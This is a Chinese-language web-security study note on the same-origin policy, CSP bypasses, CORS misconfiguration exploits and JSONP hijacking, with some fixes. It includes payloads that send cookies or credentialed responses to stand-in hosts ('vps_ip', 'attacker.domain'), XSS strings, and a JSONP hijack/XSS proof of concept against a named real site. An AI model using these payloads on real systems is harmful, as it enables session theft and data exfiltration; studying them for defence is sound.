# 前端安全-跨域
[toc]

## 0x01 同源策略
> 同源策略（英语：Same-origin policy）是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。

定义：只有从当前页面的源获取的脚本，才能修改当前页面的元素或读取当前页面的数据。   
目的：浏览器需要限制JS的能力    
* 通过同源策略给JS脚本提供权限分离
* 浏览器将页面元素（布局，Cookie，事件等）和源（origin）关联在一起

同源的定义：HTML SOP中，源的定义：协议 + 域名 + 端口 （schema + domain + port）   
具体体现在两个方面：    

* 无法通过js获取其它非同源网站的DOM对象。   
如果一个页面是由另一个页面通过JS的打开的，如window.open()。那么window.open()函数返回的对象是JS可以操作的。可见这里用google打开了baidu，虽然在google页面的中可以拿到baidu页面的对象，但是因为同源策略无法访问其document对象（DOM对象），也无法访问其中的cookie。
![8bb84267751c4a3c0d43293a093c91ad.png](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/cd_1.png)
* 向不同源的站点发送请求时，虽然成功发包，但是无法读出数据，目的是防止泄露其HTTP响应头的信息，可能会泄露cookie。   
通过JS中的XMLHttpRequest对象（AJAX），发起向不同源的站点发送请求时，虽然成功发包，但是无法读出数据，目的是防止泄露其HTTP响应头的信息，可能会泄露cookie。不过任何标签通过src均可发生跨域请求，并且成功接收，原因是JS也无法获得其内容，所以一般来说是安全的，不需要限制（CSP机制可以限制）。
![01a77e869291212cc99bce10b03da281.png](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/cd_2.png)
## 0x02 内容安全策略( CSP )

### Introduction
内容安全策略   (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。   
CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。   
配置CSP的条件：
* 你需要配置你的网络服务器返回  Content-Security-Policy  HTTP头部 ( 有时你会看到一些关于X-Content-Security-Policy头部的提法, 那是旧版本，你无须再如此指定它)。   
*  <meta>  元素也可以被用来配置该策略。   
Eg.   
`<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">`

可以自定义策略：   
```
Content-Security-Policy: policy
```
Eg.一个网站管理者允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)    
```
Content-Security-Policy: default-src 'self' *.trusted.com
```
关键词：   

* default-src
* img-src
* script-src
* frame-src:控制内嵌框架包含的外部页面连接：iframe or a frame。
* inline script和eval类型函数(包括eval、setInterval、setTimeout和new Function())是不被执行的。另外data URIs也是默认不允许使用的，XBL,只允许通过chrome:和resource:形式uri请求的XBL,其它的比如在CSS中通过-moz-binding来指定的XBL则不允许被执行。

### 漏洞检测
CSP online检测工具：https://csp-evaluator.withgoogle.com/   
### bypass

#### location.href

```
location.href = "vps_ip:xxxx?"+document.cookie
```

利用条件:   
可以执行任意JS脚本，但是由于CSP无法数据带外   

#### link
导致的绕过这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了
因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。   
```
<!-- firefox -->
<link rel="dns-prefetch" href="//${cookie}.vps_ip">
<!-- chrome -->
<link rel="prefetch" href="//vps_ip?${cookie}">
```
```
var link = document.createElement("link");
link.setAttribute("rel", "prefetch");
link.setAttribute("href", "//vps_ip/?" + document.cookie);
document.head.appendChild(link);
```
利用条件:   
可以执行任意JS脚本，但是由于CSP无法数据带外   

#### Iframe
当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效   
A页面:   
```
<!-- A页面 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
<h1 id="flag">flag{0xffff}</h1>
```
B页面:   

```
<!-- B页面 -->
<!-- 下面模拟XSS -->
<body>
<script>
var iframe = document.createElement('iframe');
iframe.src="A页面";
document.body.appendChild(iframe);
setTimeout(()=>alert(iframe.contentWindow.document.getElementById('flag').innerHTML),1000);
</script>
</body>
```
利用条件:   

* 一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞
* 我们需要的数据在存在CSP保护的页面
#### 用CDN来绕过
CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险。
[A Wormable XSS on HackMD!](https://paper.seebug.org/855/)，利用CDN中低版本的angular js模板注入来绕过CSP。    

利用条件:   
CDN服务商存在某些低版本的js库。   
此CDN服务商在CSP白名单中。   

#### 站点可控静态资源绕过     

`www.google.analytics.com`中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP   
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-eval' https://www.google-analytics.com">
<script src="https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64"></script>
```

利用条件:   

* 站点存在可控静态资源
* 站点在CSP白名单中

#### 站点可控JSONP绕过

大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置    x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析   
以ins'hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了www.google.com    

```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src https://www.google.com">

<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert"></script>
```
![8b1b8d45b6a6e2597e4f88d645c71853.png](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/cd_3.png)

利用条件:   
站点存在可控Jsonp站点   
在CSP白名单中   

#### Base-uri绕过

#### 不完整script标签绕过nonce

#### object-src绕过（PDFXSS）
#### SVG绕过
#### 不完整的资源标签获取资源
#### CSS选择器获取内容
#### CRLF绕过

Ref[][内容安全策略( CSP )](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)   
Ref[][我的CSP绕过思路及总结](https://xz.aliyun.com/t/5084)   
## 0x03 HTTP访问控制（CORS）
>跨源资源共享（CORS，或通俗地译为跨域资源共享）是一种基于 HTTP 头的机制，该机制通过允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。在预检中，浏览器发送的头中标示有 HTTP 方法和真实请求中会用到的头。

- CORS和CSP的区别，实质都是跨域，CORS是浏览器允许获取的网站凭证或数据，而CSP是通过浏览器保护你所访问的内容的安全。     
- 这些跨域请求与浏览器发出的其他跨域请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。   

Eg.   
比如说，假如站点 http://foo.example 的网页应用想要访问 http://bar.other 的资源。http://foo.example 的网页中可能包含类似于下面的 JavaScript 代码：   

```
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/public-data/';
   
function callOtherDomain() {
  if(invocation) {    
    invocation.open('GET', url, true);
    invocation.onreadystatechange = handler;
    invocation.send(); 
  }
}
```
客户端和服务器之间使用 CORS 首部字段来处理跨域权限：   
分别检视请求报文和响应报文：   
Request   
```
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example 
```
Response   
```
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61 
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml

[XML Data]   
```
使用 Origin 和 Access-Control-Allow-Origin 就能完成最简单的访问控制.   

默认情况下，如果没有设置“Access-Control-Allow-Credentials”这个头的话，浏览器发送的请求就不会带有用户的身份数据（cookie或者HTTP身份数据），所以就不会泄露用户隐私信息。    
CORS保护的例子    
![9a8a99144c3b3b73adff885de3b03466.png](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/cd4.png)
### 漏洞发现
通过发送请求，判断回报是否允许   
```
GET /handler_to_test HTTP/1.1
Host: target.domain
Origin: https://attaker.domain
Connection: close
```

```
HTTP/1.1 200 OK
…
Access-control-allow-credentials: true
Access-control-allow-origin: https://attacker.domain
…
```

### 漏洞利用

####  有用户凭据的利用
可利用的条件：   
Access-Control-Allow-Credentials:True   
Access-Control-Allow-Origin:Null 或者https://attacker.domain   

在这次测试示例中，服务器返回的报文头部中已经表明完全信任“attacker.   domain”这个域，并且可以向这个域中发送用户凭据。   
利用脚本：   
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open(“get”,”https://vulnerable.domain/api/private-data”,true);
req.withCredentials = true;
req.send();
function reqListener() {
location=”https//attacker.domain/log?response=”+this.responseText;
};
```
#### 没有用户凭据的利用方式
可利用的条件：   
Access-Control-Allow-Origin的值，https://attacker.com，* ，null   
可达到的效果：   
##### 绕过基于ip的身份验证

如果目标从受害者的网络中可以到达，但使用ip地址作为身份验证的方式。这种情况通常发生在缺乏严格控制的内网中。在这种场景下，黑客会利用受害者的浏览器作为代理去访问那些应用并且可以绕过那些基于ip的身份验证。就影响而言，这个类似于DNS重绑定，但会更容易利用。   
##### 客户端缓存中毒

这种配置允许攻击者利用其他的漏洞。   
比如，一个应用返回数据报文头部中包含“X-User”这个字段，这个字段的值没有经过验证就直接输出到返回页面上。请求：   
```
GET /login HTTP/1.1
Host: www.target.local
Origin: https://attacker.domain/
X-User: <svg/onload=alert(1)>
```
返回报文（注意：“Access-Control-Allow-Origin”已经被设置，但是“Access-Control-Allow-Credentials: true”并且“Vary: Origin”头没有被设置）
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.domain/
…
Content-Type: text/html
…
Invalid user: <svg/onload=alert(1)
```
攻击者可以把xss的exp放在自己控制的服务器中的JavaScript代码里面然后等待受害者去触发它。   
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://www.target.local/login',true);
req.setRequestHeader('X-User', '<svg/onload=alert(1)>');
req.send();
function reqListener() {
location='http://www.target.local/login';
}
```
如果在返回报文中头部没有设置“Vary: Origin”，那么可以利用上面展示的例子，可以让受害者浏览器中的缓存中存储返回数据报文（这要基于浏览器的行为）并且当浏览器访问到相关URL的时候就会直接显示出来。（通过重定向来实现，可以用“reqListener()”这个方法）    
##### 服务器端缓存中毒？？？

### Bypass

#### NULL源

CORS的规范中还提到了“NULL”源。触发这个源是为了网页跳转或者是来自本地HTML文件。目标应用可能会接收“null"源，并且这个可能被测试者（或者攻击者）利用，意外任何网站很容易使用沙盒iframe来获取”null“源    

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>CORS request here</script>’></iframe>
```

#### 注册一个前缀相同的域名

#### 第三方域名和子域名

#### 特殊字符，利用正则

- Ref[][HTTP访问控制（CORS）](
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)   

- Ref[]:[cors安全完全指南](https://xz.aliyun.com/t/2745)
## 0x04 JSONP-非官方跨域数据交互协议
JSONP（JSON with Padding）
>JSONP是一种依靠开发人员的聪明才智创造出的一种非官方跨域数据交互协议。 在进行 Ajax 请求时，由于同源策略的影响，不能进行跨域请求，而<script>标签的 src 属性却可以加载跨域的 JavaScript 脚本，JSONP 就是利用这一特性实现的。与普通的 Ajax 请求不同，在使用 JSONP 进行跨域请求时，服务器不再返回 JSON 格式的数据，而是返回一段调用某个函数的 JavaScript 代码，在 src 属性种调用，来实现跨域。
       
- JSONP更像是一个漏洞，程序员可以利用这个漏洞，实现跨域（可以简单理解为跨域名）传输数据
- 利用拥有src这个属性的标签的跨域能力，比如<script>、<img>、<iframe>    

### 原生JS实现JSONP的步骤
**服务端**
访问 : https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction。
期望返回数据：["customername1","customername2"]。
真正返回到客户端的数据显示为: callbackFunction(["customername1","customername2"])。
服务端文件 jsonp.php 代码为：
```php
<?php
header('Content-type: application/json');
//获取回调函数名
$jsoncallback = htmlspecialchars($_REQUEST ['jsoncallback']);
//json数据
$json_data = '["customername1","customername2"]';
//输出jsonp格式的数据
echo $jsoncallback . "(" . $json_data . ")";
?> 
```
**客户端**
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>JSONP 实例</title>
</head>
<body>
<div id="divCustomers"></div>
<script type="text/javascript">
function callbackFunction(result, methodName)
{
    var html = '<ul>';
    for(var i = 0; i < result.length; i++)
    {
        html += '<li>' + result[i] + '</li>';
    }
    html += '</ul>';
    document.getElementById('divCustomers').innerHTML = html;
}
</script>
<script type="text/javascript" src="https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction"></script>
</body>
</html>
```


Ref[]:[JSONP跨域详解](https://www.jianshu.com/p/e1e2920dac95)

### JSONP劫持
JSONP原理就是绕过同源策略实现相应功能，这也必然会出现安全问题。    
Eg. A网站存在jsonp调用的代码，B网站已登录，若B网站信任A网站（或验证条件不严格）通过jsonp可以获取B网站的登录凭证。    

漏洞挖掘方法：   
关键词：callback json jsonp   


#### 修复方案
1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。   
2、严格执行JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。   
3、严格过滤 callback 函数名及 JSON 里数据的输出。   
4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。   
5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：`/**/`、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。    

#### Bypass方法
1. Referer限制不严格，比如baidu.com的域名限制，购买个baidu.com.reabout.com域名。   
空 Referer 的绕过法，比如当浏览器直接访问某地址的时候，是不带 Referer 的，是为空的，比如 <iframe> 标签。   
2. 随机token，爆破  

游侠网jsonp漏洞例子，一是jsonp劫持，二是jsonp xss漏洞。   
```
<html>
<script>
function jsonp2(json){ 
alert(JSON.stringify(json)) 
document.write(JSON.stringify(json))
  } 
</script>  

<script src="http://i.ali213.net/api.html?action=logout&callback=jsonp2"></script></br>
<a>XSS漏洞地址：</a><a href="http://i.ali213.net/api.html?action=logout&callback=a<script>alert(1)</script>a" target="_blank">请点击！</a>
</html>
```

- Ref[]:[JSONP 劫持原理与挖掘方法](https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/)
- Ref[]:[对jsonp劫持的一次简单了解](http://sh1yan.top/2018/08/12/jsonp-study/)


## Ref
- https://xuanxuanblingbling.github.io/



